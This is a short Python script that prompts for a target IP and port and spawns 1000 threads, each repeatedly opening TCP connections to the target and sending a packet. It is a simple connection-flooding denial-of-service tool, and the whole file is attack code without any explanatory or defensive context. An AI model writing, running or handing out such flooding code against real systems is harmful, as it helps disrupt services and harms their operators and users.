import socket
import threading
import time

TARGET_IP = input("TARGET IP: ")
TARGET_PORT = int(input("TARGET PORT: "))
NUM_THREADS = 1000

def send_packets():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(b"Test packet\n")
            s.close()
        except Exception as e:
            print(f"Error: {e}")
            break

threads = []

for _ in range(NUM_THREADS):
    t = threading.Thread(target=send_packets)
    t.start()
    threads.append(t)
    time.sleep(0.01)

for t in threads:
    t.join()
